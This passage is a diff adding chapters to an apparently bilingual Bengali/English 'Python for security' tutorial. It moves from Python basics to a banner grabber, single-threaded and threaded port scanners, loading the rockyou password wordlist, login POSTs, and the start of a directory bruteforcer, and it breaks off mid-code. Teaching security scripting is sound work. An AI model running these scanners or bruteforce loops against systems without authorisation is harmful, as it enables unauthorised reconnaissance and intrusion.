+      <p><span class="bn-text"><strong>VS Code</strong> ব্যবহার করো — Python extension install করো। অথবা শুধু terminal-এ <code>python3</code> লিখে interactive mode-এ practice করো।</span><span class="en-text">Use <strong>VS Code</strong> — install the Python extension. Or just type <code>python3</code> in the terminal and practice in interactive mode.</span></p>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 2: VARIABLES & DATA TYPES
+══════════════════════════════════════ -->
+<div class="chapter ch2">
+  <div class="chapter-header" data-num="02">
+    <div class="ch-label">CHAPTER 02</div>
+    <div class="ch-title">📦 <span class="bn-text">Variable, Data Types ও Input/Output</span><span class="en-text">Variables, Data Types & Input/Output</span></div>
+    <div class="ch-desc"><span class="bn-text">Python-এর সব data type, variable declaration এবং user input নেওয়া</span><span class="en-text">All Python data types, variable declaration, and taking user input</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Variable কী?</span><span class="en-text">What is a Variable?</span></h2>
+    <p><span class="bn-text">Variable হলো একটি নাম যেখানে data রাখা যায়। Python-এ variable declare করতে কোনো keyword লাগে না।</span><span class="en-text">A variable is a name where data can be stored. In Python, no keyword is needed to declare a variable.</span></p>
+    <div class="code">
+<span class="c"># Variable তৈরি করা</span>
+name = <span class="s">"Alice"</span>         <span class="c"># String</span>
+age  = <span class="num">25</span>              <span class="c"># Integer</span>
+score = <span class="num">98.5</span>           <span class="c"># Float</span>
+is_hacker = <span class="kw">True</span>       <span class="c"># Boolean</span>
+
+<span class="kw">print</span>(name)
+<span class="kw">print</span>(<span class="s">"বয়স:"</span>, age)
+<span class="kw">print</span>(<span class="s">f"নাম: {name}, বয়স: {age}"</span>)  <span class="c"># f-string</span>
+    </div>
+    <div class="output">Alice
+বয়স: 25
+নাম: Alice, বয়স: 25</div>
+
+    <h2 class="sec"><span class="bn-text">সব Data Types</span><span class="en-text">All Data Types</span></h2>
+    <div class="code">
+<span class="c"># int — পূর্ণ সংখ্যা</span>
+port = <span class="num">80</span>
+<span class="kw">print</span>(<span class="kw">type</span>(port))   <span class="c"># &lt;class 'int'&gt;</span>
+
+<span class="c"># float — দশমিক সংখ্যা</span>
+version = <span class="num">3.11</span>
+
+<span class="c"># str — টেক্সট</span>
+ip = <span class="s">"192.168.1.1"</span>
+domain = <span class="s">'example.com'</span>
+
+<span class="c"># bool — True/False</span>
+is_open = <span class="kw">True</span>
+is_admin = <span class="kw">False</span>
+
+<span class="c"># list — পরিবর্তনযোগ্য তালিকা [ ]</span>
+ports = [<span class="num">21</span>, <span class="num">22</span>, <span class="num">80</span>, <span class="num">443</span>, <span class="num">8080</span>]
+ports.append(<span class="num">3306</span>)   <span class="c"># যোগ করা</span>
+ports.remove(<span class="num">21</span>)     <span class="c"># বাদ দেওয়া</span>
+<span class="kw">print</span>(ports[<span class="num">0</span>])      <span class="c"># 22 (0 থেকে শুরু)</span>
+
+<span class="c"># tuple — অপরিবর্তনীয় তালিকা ( )</span>
+protocols = (<span class="s">"TCP"</span>, <span class="s">"UDP"</span>, <span class="s">"ICMP"</span>)
+
+<span class="c"># dict — key:value জোড়া { }</span>
+target = {
+    <span class="s">"ip"</span>: <span class="s">"192.168.1.1"</span>,
+    <span class="s">"port"</span>: <span class="num">80</span>,
+    <span class="s">"service"</span>: <span class="s">"HTTP"</span>
+}
+<span class="kw">print</span>(target[<span class="s">"ip"</span>])      <span class="c"># 192.168.1.1</span>
+<span class="kw">print</span>(target.get(<span class="s">"port"</span>)) <span class="c"># 80</span>
+
+<span class="c"># set — unique values { }</span>
+open_ports = {<span class="num">80</span>, <span class="num">443</span>, <span class="num">80</span>, <span class="num">22</span>}  <span class="c"># {80, 443, 22} — duplicate বাদ</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">String Operations — Security-তে গুরুত্বপূর্ণ</span><span class="en-text">String Operations — Important in Security</span></h2>
+    <div class="code">
+url = <span class="s">"https://target.com/login?id=1"</span>
+
+<span class="c"># String methods</span>
+<span class="kw">print</span>(url.upper())           <span class="c"># HTTPS://TARGET.COM/LOGIN?ID=1</span>
+<span class="kw">print</span>(url.lower())           <span class="c"># lowercase</span>
+<span class="kw">print</span>(url.replace(<span class="s">"https"</span>, <span class="s">"http"</span>))
+<span class="kw">print</span>(url.split(<span class="s">"/"</span>))        <span class="c"># ['https:', '', 'target.com', ...]</span>
+<span class="kw">print</span>(<span class="s">"login"</span> <span class="kw">in</span> url)        <span class="c"># True</span>
+<span class="kw">print</span>(url.startswith(<span class="s">"https"</span>)) <span class="c"># True</span>
+<span class="kw">print</span>(len(url))              <span class="c"># length</span>
+
+<span class="c"># String slicing</span>
+ip = <span class="s">"192.168.1.100"</span>
+<span class="kw">print</span>(ip[<span class="num">0</span>:<span class="num">3</span>])    <span class="c"># "192"</span>
+<span class="kw">print</span>(ip[-<span class="num">3</span>:])   <span class="c"># "100"</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Input/Output</span><span class="en-text">Input/Output</span></h2>
+    <div class="code">
+<span class="c"># User থেকে input নেওয়া</span>
+target_ip = <span class="kw">input</span>(<span class="s">"Target IP দাও: "</span>)
+port = <span class="kw">int</span>(<span class="kw">input</span>(<span class="s">"Port number: "</span>))  <span class="c"># int() দিয়ে convert</span>
+
+<span class="kw">print</span>(<span class="s">f"Scanning {target_ip}:{port}..."</span>)
+
+<span class="c"># Type conversion</span>
+<span class="kw">int</span>(<span class="s">"80"</span>)        <span class="c"># "80" → 80</span>
+<span class="kw">str</span>(<span class="num">443</span>)         <span class="c"># 443 → "443"</span>
+<span class="kw">float</span>(<span class="s">"3.14"</span>)    <span class="c"># "3.14" → 3.14</span>
+<span class="kw">list</span>(<span class="s">"abc"</span>)      <span class="c"># ['a', 'b', 'c']</span>
+    </div>
+
+    <div class="ch-summary">
+      <h3>// <span class="bn-text">মূল কথা</span><span class="en-text">Key Points</span> //</h3>
+      <ul>
+        <li>🐍 <span class="bn-text">Python-এ variable declare করতে keyword লাগে না</span><span class="en-text">No keyword needed to declare variables in Python</span></li>
+        <li>📋 <span class="bn-text">list = পরিবর্তনযোগ্য, tuple = অপরিবর্তনীয়, dict = key:value</span><span class="en-text">list = mutable, tuple = immutable, dict = key:value</span></li>
+        <li>🔤 <span class="bn-text">f-string দিয়ে সহজে variable print করা যায়</span><span class="en-text">f-strings make printing variables easy</span></li>
+        <li>🔄 <span class="bn-text">input() সবসময় string return করে — convert করতে হয়</span><span class="en-text">input() always returns a string — must convert it</span></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 3: CONDITIONS & LOOPS
+══════════════════════════════════════ -->
+<div class="chapter ch3">
+  <div class="chapter-header" data-num="03">
+    <div class="ch-label">CHAPTER 03</div>
+    <div class="ch-title">🔀 <span class="bn-text">Operators, Conditions ও Loops</span><span class="en-text">Operators, Conditions & Loops</span></div>
+    <div class="ch-desc"><span class="bn-text">if/elif/else, for loop, while loop — Python-এর মূল control flow</span><span class="en-text">if/elif/else, for loop, while loop — Python's core control flow</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Comparison ও Logical Operators</span><span class="en-text">Comparison & Logical Operators</span></h2>
+    <div class="code">
+<span class="c"># Comparison operators</span>
+<span class="kw">print</span>(<span class="num">80</span> == <span class="num">80</span>)    <span class="c"># True  — সমান</span>
+<span class="kw">print</span>(<span class="num">80</span> != <span class="num">443</span>)   <span class="c"># True  — সমান না</span>
+<span class="kw">print</span>(<span class="num">8080</span> > <span class="num">80</span>)   <span class="c"># True  — বড়</span>
+<span class="kw">print</span>(<span class="num">21</span> < <span class="num">22</span>)    <span class="c"># True  — ছোট</span>
+
+<span class="c"># Logical operators</span>
+port = <span class="num">443</span>
+<span class="kw">print</span>(port > <span class="num">80</span> <span class="kw">and</span> port < <span class="num">1000</span>)   <span class="c"># True — দুটোই True</span>
+<span class="kw">print</span>(port == <span class="num">80</span> <span class="kw">or</span> port == <span class="num">443</span>)   <span class="c"># True — যেকোনো একটা True</span>
+<span class="kw">print</span>(<span class="kw">not</span> (port == <span class="num">22</span>))            <span class="c"># True — উল্টো</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">if / elif / else</span><span class="en-text">if / elif / else</span></h2>
+    <div class="code">
+port = <span class="num">22</span>
+
+<span class="kw">if</span> port == <span class="num">21</span>:
+    <span class="kw">print</span>(<span class="s">"FTP — File Transfer"</span>)
+<span class="kw">elif</span> port == <span class="num">22</span>:
+    <span class="kw">print</span>(<span class="s">"SSH — Secure Shell"</span>)
+<span class="kw">elif</span> port == <span class="num">80</span>:
+    <span class="kw">print</span>(<span class="s">"HTTP — Web Server"</span>)
+<span class="kw">elif</span> port == <span class="num">443</span>:
+    <span class="kw">print</span>(<span class="s">"HTTPS — Secure Web"</span>)
+<span class="kw">else</span>:
+    <span class="kw">print</span>(<span class="s">f"Unknown service on port {port}"</span>)
+    </div>
+    <div class="output">SSH — Secure Shell</div>
+
+    <h2 class="sec"><span class="bn-text">for Loop</span><span class="en-text">for Loop</span></h2>
+    <div class="code">
+<span class="c"># List-এর উপর loop</span>
+ports = [<span class="num">21</span>, <span class="num">22</span>, <span class="num">80</span>, <span class="num">443</span>, <span class="num">8080</span>]
+<span class="kw">for</span> port <span class="kw">in</span> ports:
+    <span class="kw">print</span>(<span class="s">f"Checking port {port}..."</span>)
+
+<span class="c"># range() দিয়ে loop</span>
+<span class="kw">for</span> i <span class="kw">in</span> <span class="f">range</span>(<span class="num">1</span>, <span class="num">6</span>):   <span class="c"># 1 থেকে 5</span>
+    <span class="kw">print</span>(i)
+
+<span class="c"># String-এর উপর loop</span>
+password = <span class="s">"secret"</span>
+<span class="kw">for</span> char <span class="kw">in</span> password:
+    <span class="kw">print</span>(char, end=<span class="s">"-"</span>)  <span class="c"># s-e-c-r-e-t-</span>
+
+<span class="c"># enumerate — index সহ</span>
+services = [<span class="s">"FTP"</span>, <span class="s">"SSH"</span>, <span class="s">"HTTP"</span>]
+<span class="kw">for</span> i, service <span class="kw">in</span> <span class="f">enumerate</span>(services):
+    <span class="kw">print</span>(<span class="s">f"{i}: {service}"</span>)
+
+<span class="c"># dict-এর উপর loop</span>
+target = {<span class="s">"ip"</span>: <span class="s">"192.168.1.1"</span>, <span class="s">"port"</span>: <span class="num">80</span>}
+<span class="kw">for</span> key, value <span class="kw">in</span> target.items():
+    <span class="kw">print</span>(<span class="s">f"{key} = {value}"</span>)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">while Loop</span><span class="en-text">while Loop</span></h2>
+    <div class="code">
+<span class="c"># while loop — condition সত্য হওয়া পর্যন্ত চলে</span>
+attempts = <span class="num">0</span>
+<span class="kw">while</span> attempts < <span class="num">3</span>:
+    password = <span class="kw">input</span>(<span class="s">"Password: "</span>)
+    <span class="kw">if</span> password == <span class="s">"admin123"</span>:
+        <span class="kw">print</span>(<span class="s">"✅ Login Successful!"</span>)
+        <span class="kw">break</span>       <span class="c"># loop থেকে বের হয়ে যাও</span>
+    <span class="kw">else</span>:
+        attempts += <span class="num">1</span>
+        <span class="kw">print</span>(<span class="s">f"❌ Wrong! {3 - attempts} attempts left"</span>)
+<span class="kw">else</span>:
+    <span class="kw">print</span>(<span class="s">"🔒 Account Locked!"</span>)
+
+<span class="c"># continue — এই iteration skip করো</span>
+<span class="kw">for</span> port <span class="kw">in</span> <span class="f">range</span>(<span class="num">1</span>, <span class="num">10</span>):
+    <span class="kw">if</span> port % <span class="num">2</span> == <span class="num">0</span>:
+        <span class="kw">continue</span>    <span class="c"># জোড় port skip</span>
+    <span class="kw">print</span>(port)     <span class="c"># শুধু বিজোড় print</span>
+    </div>
+
+    <div class="ch-summary">
+      <h3>// <span class="bn-text">মূল কথা</span><span class="en-text">Key Points</span> //</h3>
+      <ul>
+        <li>🔀 <span class="bn-text">Python-এ indentation (4 space) দিয়ে code block বোঝায়</span><span class="en-text">Python uses indentation (4 spaces) to define code blocks</span></li>
+        <li>🔄 <span class="bn-text">for loop — জানা সংখ্যক বার; while loop — condition পূরণ না হওয়া পর্যন্ত</span><span class="en-text">for loop — known iterations; while loop — until condition fails</span></li>
+        <li>⛔ <span class="bn-text">break = loop বন্ধ করো; continue = এই step skip করো</span><span class="en-text">break = stop loop; continue = skip this step</span></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 4: FUNCTIONS & MODULES
+══════════════════════════════════════ -->
+<div class="chapter ch4">
+  <div class="chapter-header" data-num="04">
+    <div class="ch-label">CHAPTER 04</div>
+    <div class="ch-title">⚙️ <span class="bn-text">Functions ও Modules</span><span class="en-text">Functions & Modules</span></div>
+    <div class="ch-desc"><span class="bn-text">Reusable code লেখা এবং Python-এর শক্তিশালী built-in modules ব্যবহার</span><span class="en-text">Writing reusable code and using Python's powerful built-in modules</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Function তৈরি করা</span><span class="en-text">Creating Functions</span></h2>
+    <div class="code">
+<span class="c"># Basic function</span>
+<span class="kw">def</span> <span class="f">greet</span>(name):
+    <span class="kw">print</span>(<span class="s">f"Hello, {name}!"</span>)
+
+greet(<span class="s">"Alice"</span>)   <span class="c"># Hello, Alice!</span>
+
+<span class="c"># Return value সহ function</span>
+<span class="kw">def</span> <span class="f">get_service</span>(port):
+    services = {
+        <span class="num">21</span>: <span class="s">"FTP"</span>, <span class="num">22</span>: <span class="s">"SSH"</span>, <span class="num">80</span>: <span class="s">"HTTP"</span>,
+        <span class="num">443</span>: <span class="s">"HTTPS"</span>, <span class="num">3306</span>: <span class="s">"MySQL"</span>
+    }
+    <span class="kw">return</span> services.get(port, <span class="s">"Unknown"</span>)
+
+<span class="kw">print</span>(get_service(<span class="num">80</span>))    <span class="c"># HTTP</span>
+<span class="kw">print</span>(get_service(<span class="num">9999</span>))  <span class="c"># Unknown</span>
+
+<span class="c"># Default parameter</span>
+<span class="kw">def</span> <span class="f">scan_port</span>(ip, port=<span class="num">80</span>):
+    <span class="kw">print</span>(<span class="s">f"Scanning {ip}:{port}"</span>)
+
+scan_port(<span class="s">"192.168.1.1"</span>)        <span class="c"># port=80 (default)</span>
+scan_port(<span class="s">"192.168.1.1"</span>, <span class="num">443</span>)  <span class="c"># port=443</span>
+
+<span class="c"># Multiple return values</span>
+<span class="kw">def</span> <span class="f">get_info</span>():
+    <span class="kw">return</span> <span class="s">"192.168.1.1"</span>, <span class="num">80</span>, <span class="s">"HTTP"</span>
+
+ip, port, service = get_info()
+<span class="kw">print</span>(ip, port, service)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">গুরুত্বপূর্ণ Built-in Modules</span><span class="en-text">Important Built-in Modules</span></h2>
+    <h3 class="sub">os — Operating System</h3>
+    <div class="code">
+<span class="kw">import</span> os
+
+<span class="c"># File ও Directory</span>
+<span class="kw">print</span>(os.getcwd())              <span class="c"># Current directory</span>
+os.listdir(<span class="s">"."</span>)                <span class="c"># Directory contents</span>
+os.path.exists(<span class="s">"/etc/passwd"</span>)  <span class="c"># File আছে কি না</span>
+os.makedirs(<span class="s">"output"</span>, exist_ok=<span class="kw">True</span>)
+
+<span class="c"># Command চালানো</span>
+os.system(<span class="s">"ls -la"</span>)
+os.system(<span class="s">"ping -c 1 google.com"</span>)
+
+<span class="c"># Environment variables</span>
+path = os.environ.get(<span class="s">"PATH"</span>)
+home = os.path.expanduser(<span class="s">"~"</span>)
+    </div>
+
+    <h3 class="sub">sys — System</h3>
+    <div class="code">
+<span class="kw">import</span> sys
+
+<span class="c"># Command line arguments</span>
+<span class="c"># python3 script.py 192.168.1.1 80</span>
+<span class="kw">if</span> <span class="f">len</span>(sys.argv) < <span class="num">3</span>:
+    <span class="kw">print</span>(<span class="s">f"Usage: {sys.argv[0]} &lt;ip&gt; &lt;port&gt;"</span>)
+    sys.exit(<span class="num">1</span>)
+
+ip   = sys.argv[<span class="num">1</span>]   <span class="c"># 192.168.1.1</span>
+port = sys.argv[<span class="num">2</span>]   <span class="c"># 80</span>
+
+<span class="kw">print</span>(sys.version)    <span class="c"># Python version</span>
+<span class="kw">print</span>(sys.platform)   <span class="c"># linux/win32/darwin</span>
+    </div>
+
+    <h3 class="sub">re — Regular Expressions</h3>
+    <div class="code">
+<span class="kw">import</span> re
+
+log = <span class="s">"192.168.1.100 - - [25/Mar/2026] GET /admin HTTP/1.1 200"</span>
+
+<span class="c"># IP address খোঁজা</span>
+ip_pattern = <span class="s">r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'</span>
+ip = re.findall(ip_pattern, log)
+<span class="kw">print</span>(ip)              <span class="c"># ['192.168.1.100']</span>
+
+<span class="c"># Email খোঁজা</span>
+text = <span class="s">"Contact: alice@target.com or bob@example.org"</span>
+emails = re.findall(<span class="s">r'[\w.]+@[\w.]+\.\w+'</span>, text)
+<span class="kw">print</span>(emails)          <span class="c"># ['alice@target.com', 'bob@example.org']</span>
+
+<span class="c"># Match করলে True</span>
+<span class="kw">if</span> re.match(<span class="s">r'^\d{1,3}(\.\d{1,3}){3}$'</span>, <span class="s">"192.168.1.1"</span>):
+    <span class="kw">print</span>(<span class="s">"Valid IP"</span>)
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 5: FILE HANDLING & EXCEPTIONS
+══════════════════════════════════════ -->
+<div class="chapter ch5">
+  <div class="chapter-header" data-num="05">
+    <div class="ch-label">CHAPTER 05</div>
+    <div class="ch-title">📁 <span class="bn-text">File Handling ও Exception Handling</span><span class="en-text">File Handling & Exception Handling</span></div>
+    <div class="ch-desc"><span class="bn-text">File পড়া/লেখা এবং error handle করা — Security Script-এর জন্য অপরিহার্য</span><span class="en-text">Reading/writing files and handling errors — essential for security scripts</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">File পড়া ও লেখা</span><span class="en-text">Reading & Writing Files</span></h2>
+    <div class="code">
+<span class="c"># File লেখা (write)</span>
+<span class="kw">with</span> <span class="f">open</span>(<span class="s">"targets.txt"</span>, <span class="s">"w"</span>) <span class="kw">as</span> f:
+    f.write(<span class="s">"192.168.1.1\n"</span>)
+    f.write(<span class="s">"192.168.1.2\n"</span>)
+    f.write(<span class="s">"10.0.0.1\n"</span>)
+
+<span class="c"># File পড়া (read)</span>
+<span class="kw">with</span> <span class="f">open</span>(<span class="s">"targets.txt"</span>, <span class="s">"r"</span>) <span class="kw">as</span> f:
+    content = f.read()
+    <span class="kw">print</span>(content)
+
+<span class="c"># Line by line পড়া — বড় file-এর জন্য ভালো</span>
+<span class="kw">with</span> <span class="f">open</span>(<span class="s">"targets.txt"</span>, <span class="s">"r"</span>) <span class="kw">as</span> f:
+    <span class="kw">for</span> line <span class="kw">in</span> f:
+        ip = line.strip()   <span class="c"># newline বাদ দেওয়া</span>
+        <span class="kw">print</span>(<span class="s">f"Scanning: {ip}"</span>)
+
+<span class="c"># Append — বিদ্যমান file-এ যোগ করা</span>
+<span class="kw">with</span> <span class="f">open</span>(<span class="s">"results.txt"</span>, <span class="s">"a"</span>) <span class="kw">as</span> f:
+    f.write(<span class="s">"192.168.1.1:80 OPEN\n"</span>)
+
+<span class="c"># Wordlist থেকে passwords পড়া</span>
+<span class="kw">with</span> <span class="f">open</span>(<span class="s">"/usr/share/wordlists/rockyou.txt"</span>, <span class="s">"r"</span>, encoding=<span class="s">"latin-1"</span>) <span class="kw">as</span> f:
+    passwords = [line.strip() <span class="kw">for</span> line <span class="kw">in</span> f]
+<span class="kw">print</span>(<span class="s">f"Loaded {len(passwords)} passwords"</span>)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Exception Handling — Error ধরা</span><span class="en-text">Exception Handling — Catching Errors</span></h2>
+    <div class="code">
+<span class="c"># try/except — error হলেও program crash করবে না</span>
+<span class="kw">try</span>:
+    port = <span class="kw">int</span>(<span class="kw">input</span>(<span class="s">"Port: "</span>))
+    result = <span class="num">100</span> / port
+    <span class="kw">print</span>(<span class="s">f"Result: {result}"</span>)
+<span class="kw">except</span> ValueError:
+    <span class="kw">print</span>(<span class="s">"❌ সংখ্যা দাও!"</span>)
+<span class="kw">except</span> ZeroDivisionError:
+    <span class="kw">print</span>(<span class="s">"❌ 0 দিও না!"</span>)
+<span class="kw">except</span> Exception <span class="kw">as</span> e:
+    <span class="kw">print</span>(<span class="s">f"❌ Error: {e}"</span>)
+<span class="kw">finally</span>:
+    <span class="kw">print</span>(<span class="s">"✅ Program শেষ"</span>)  <span class="c"># সবসময় চলবে</span>
+
+<span class="c"># File না থাকলে error handle</span>
+<span class="kw">try</span>:
+    <span class="kw">with</span> <span class="f">open</span>(<span class="s">"wordlist.txt"</span>) <span class="kw">as</span> f:
+        data = f.read()
+<span class="kw">except</span> FileNotFoundError:
+    <span class="kw">print</span>(<span class="s">"❌ File পাওয়া যায়নি!"</span>)
+    </div>
+
+    <div class="box success">
+      <div class="box-t">✅ <span class="bn-text">Best Practice</span><span class="en-text">Best Practice</span></div>
+      <p><span class="bn-text">সবসময় <code>with</code> statement ব্যবহার করো file open করতে — এটা automatically file close করে দেয়। Security script-এ সবসময় try/except ব্যবহার করো যাতে connection refuse বা timeout-এ crash না হয়।</span><span class="en-text">Always use the <code>with</code> statement to open files — it automatically closes the file. Always use try/except in security scripts so they don't crash on connection refusals or timeouts.</span></p>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 6: NETWORKING — SOCKET
+══════════════════════════════════════ -->
+<div class="chapter ch6">
+  <div class="chapter-header" data-num="06">
+    <div class="ch-label">CHAPTER 06</div>
+    <div class="ch-title">🌐 <span class="bn-text">Networking — Socket Programming</span><span class="en-text">Networking — Socket Programming</span></div>
+    <div class="ch-desc"><span class="bn-text">socket module দিয়ে নিজের Port Scanner ও Banner Grabber তৈরি করো</span><span class="en-text">Build your own Port Scanner and Banner Grabber using the socket module</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Socket কী?</span><span class="en-text">What is a Socket?</span></h2>
+    <p><span class="bn-text">Socket হলো দুটো computer-এর মধ্যে network connection-এর endpoint। Python-এর <code>socket</code> module দিয়ে আমরা TCP/UDP connection তৈরি করতে পারি।</span><span class="en-text">A socket is a network connection endpoint between two computers. Python's <code>socket</code> module lets us create TCP/UDP connections.</span></p>
+
+    <h2 class="sec"><span class="bn-text">Basic TCP Connection ও Banner Grabbing</span><span class="en-text">Basic TCP Connection & Banner Grabbing</span></h2>
+    <div class="code">
+<span class="kw">import</span> socket
+
+<span class="c"># TCP connection তৈরি</span>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(<span class="num">3</span>)   <span class="c"># 3 second timeout</span>
+
+target = <span class="s">"example.com"</span>
+port   = <span class="num">80</span>
+
+result = s.connect_ex((target, port))
+<span class="kw">if</span> result == <span class="num">0</span>:
+    <span class="kw">print</span>(<span class="s">f"✅ Port {port} is OPEN"</span>)
+<span class="kw">else</span>:
+    <span class="kw">print</span>(<span class="s">f"❌ Port {port} is CLOSED"</span>)
+s.close()
+
+<span class="c"># Banner Grabbing — service কী চলছে জানা</span>
+<span class="kw">def</span> <span class="f">grab_banner</span>(ip, port):
+    <span class="kw">try</span>:
+        s = socket.socket()
+        s.settimeout(<span class="num">3</span>)
+        s.connect((ip, port))
+        s.send(<span class="s">b"HEAD / HTTP/1.0\r\n\r\n"</span>)
+        banner = s.recv(<span class="num">1024</span>).decode(<span class="s">"utf-8"</span>, errors=<span class="s">"ignore"</span>)
+        s.close()
+        <span class="kw">return</span> banner
+    <span class="kw">except</span>:
+        <span class="kw">return</span> <span class="kw">None</span>
+
+banner = grab_banner(<span class="s">"scanme.nmap.org"</span>, <span class="num">80</span>)
+<span class="kw">if</span> banner:
+    <span class="kw">print</span>(banner[:<span class="num">200</span>])
+    </div>
+
+    <h2 class="sec"><span class="bn-text">🔥 Simple Port Scanner তৈরি</span><span class="en-text">🔥 Build a Simple Port Scanner</span></h2>
+    <div class="code">
+<span class="kw">import</span> socket
+<span class="kw">import</span> sys
+<span class="kw">from</span> datetime <span class="kw">import</span> datetime
+
+<span class="kw">def</span> <span class="f">scan_port</span>(ip, port):
+    <span class="kw">try</span>:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(<span class="num">1</span>)
+        result = s.connect_ex((ip, port))
+        s.close()
+        <span class="kw">return</span> result == <span class="num">0</span>
+    <span class="kw">except</span>:
+        <span class="kw">return</span> <span class="kw">False</span>
+
+<span class="kw">def</span> <span class="f">main</span>():
+    <span class="kw">if</span> <span class="f">len</span>(sys.argv) != <span class="num">3</span>:
+        <span class="kw">print</span>(<span class="s">"Usage: python3 scanner.py &lt;ip&gt; &lt;end_port&gt;"</span>)
+        sys.exit(<span class="num">1</span>)
+
+    ip       = sys.argv[<span class="num">1</span>]
+    end_port = <span class="kw">int</span>(sys.argv[<span class="num">2</span>])
+
+    <span class="kw">print</span>(<span class="s">f"\n🔍 Scanning {ip} [1-{end_port}]"</span>)
+    <span class="kw">print</span>(<span class="s">f"Started: {datetime.now()}\n"</span>)
+
+    open_ports = []
+    <span class="kw">for</span> port <span class="kw">in</span> <span class="f">range</span>(<span class="num">1</span>, end_port + <span class="num">1</span>):
+        <span class="kw">if</span> scan_port(ip, port):
+            service = socket.getservbyport(port, <span class="s">"tcp"</span>) <span class="kw">if</span> <span class="kw">True</span> <span class="kw">else</span> <span class="s">"unknown"</span>
+            <span class="kw">print</span>(<span class="s">f"  ✅ {port:5d}/tcp  OPEN"</span>)
+            open_ports.append(port)
+
+    <span class="kw">print</span>(<span class="s">f"\nFound {len(open_ports)} open ports"</span>)
+
+<span class="kw">if</span> __name__ == <span class="s">"__main__"</span>:
+    main()
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Threaded Port Scanner — দ্রুত Version</span><span class="en-text">Threaded Port Scanner — Faster Version</span></h2>
+    <div class="code">
+<span class="kw">import</span> socket
+<span class="kw">import</span> threading
+
+open_ports = []
+lock = threading.Lock()
+
+<span class="kw">def</span> <span class="f">scan</span>(ip, port):
+    <span class="kw">try</span>:
+        s = socket.socket()
+        s.settimeout(<span class="num">0.5</span>)
+        <span class="kw">if</span> s.connect_ex((ip, port)) == <span class="num">0</span>:
+            <span class="kw">with</span> lock:
+                open_ports.append(port)
+                <span class="kw">print</span>(<span class="s">f"  [+] Port {port} OPEN"</span>)
+        s.close()
+    <span class="kw">except</span>:
+        <span class="kw">pass</span>
+
+ip = <span class="s">"192.168.1.1"</span>
+threads = []
+<span class="kw">for</span> port <span class="kw">in</span> <span class="f">range</span>(<span class="num">1</span>, <span class="num">1001</span>):
+    t = threading.Thread(target=scan, args=(ip, port))
+    threads.append(t)
+    t.start()
+
+<span class="kw">for</span> t <span class="kw">in</span> threads:
+    t.join()
+
+<span class="kw">print</span>(<span class="s">f"\nOpen: {sorted(open_ports)}"</span>)
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CH 7: WEB SCRAPING & HTTP
+══════════════════════════════════════ -->
+<div class="chapter ch7">
+  <div class="chapter-header" data-num="07">
+    <div class="ch-label">CHAPTER 07</div>
+    <div class="ch-title">🕸️ <span class="bn-text">Web Scraping ও HTTP Requests</span><span class="en-text">Web Scraping & HTTP Requests</span></div>
+    <div class="ch-desc"><span class="bn-text">requests ও BeautifulSoup দিয়ে web থেকে data তোলা এবং security testing</span><span class="en-text">Extracting web data using requests and BeautifulSoup, plus security testing</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">requests Library</span><span class="en-text">requests Library</span></h2>
+    <div class="code">
+<span class="kw">import</span> requests
+
+<span class="c"># GET request</span>
+r = requests.get(<span class="s">"https://httpbin.org/get"</span>)
+<span class="kw">print</span>(r.status_code)    <span class="c"># 200</span>
+<span class="kw">print</span>(r.headers)        <span class="c"># Response headers</span>
+<span class="kw">print</span>(r.text[:<span class="num">200</span>])    <span class="c"># Response body</span>
+<span class="kw">print</span>(r.json())         <span class="c"># JSON parse</span>
+
+<span class="c"># POST request — Form submit</span>
+data = {<span class="s">"username"</span>: <span class="s">"admin"</span>, <span class="s">"password"</span>: <span class="s">"admin123"</span>}
+r = requests.post(<span class="s">"http://target.com/login"</span>, data=data)
+<span class="kw">print</span>(r.status_code)
+
+<span class="c"># Custom headers</span>
+headers = {
+    <span class="s">"User-Agent"</span>: <span class="s">"Mozilla/5.0 (compatible; SecurityScanner/1.0)"</span>,
+    <span class="s">"X-Custom-Header"</span>: <span class="s">"test"</span>
+}
+r = requests.get(<span class="s">"https://target.com"</span>, headers=headers)
+
+<span class="c"># Session — cookies maintain করা (login session)</span>
+session = requests.Session()
+session.post(<span class="s">"http://target.com/login"</span>, data={<span class="s">"user"</span>:<span class="s">"admin"</span>,<span class="s">"pass"</span>:<span class="s">"pass"</span>})
+r = session.get(<span class="s">"http://target.com/dashboard"</span>)  <span class="c"># logged-in page</span>
+
+<span class="c"># SSL disable (self-signed cert)</span>
+r = requests.get(<span class="s">"https://192.168.1.1"</span>, verify=<span class="kw">False</span>)
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Directory Bruteforcer তৈরি</span><span class="en-text">Build a Directory Bruteforcer</span></h2>
+    <div class="code">
+<span class="kw">import</span> requests
+
+<span class="kw">def</span> <span class="f">dir_brute</span>(url, wordlist_path):
+    <span class="kw">print</span>(<span class="s">f"🔍 Scanning: {url}\n"</span>)
+    found = []
+
+    <span class="kw">with</span> <span class="f">open</span>(wordlist_path) <span class="kw">as</span> f:
+        words = [line.strip() <span class="kw">for</span> line <span class="kw">in</span> f <span class="kw">if</span> line.strip()]
+
